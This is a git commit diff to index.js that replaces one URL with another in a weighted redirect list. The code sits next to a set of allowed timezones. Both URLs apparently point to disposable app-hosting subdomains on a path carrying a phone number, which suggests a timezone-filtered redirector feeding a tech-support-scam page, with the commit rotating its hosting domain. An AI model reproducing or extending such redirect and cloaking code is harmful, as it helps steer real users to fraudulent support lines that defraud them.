44b9eb19ee3e9865be96e1a19268b4399fb42f13
paalakash <palaksh452@gmail.com>
2026-07-13 04:54:09 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seal-app-yg9js.ondigitalocean.app/werrx01USAHTML/?bcda=1800-849-046", weight: 1.0 }
+    { url: "https://stingray-app-2fz6e.ondigitalocean.app/werrx01USAHTML/?bcda=1800-849-046", weight: 1.0 }
     
 ];
 
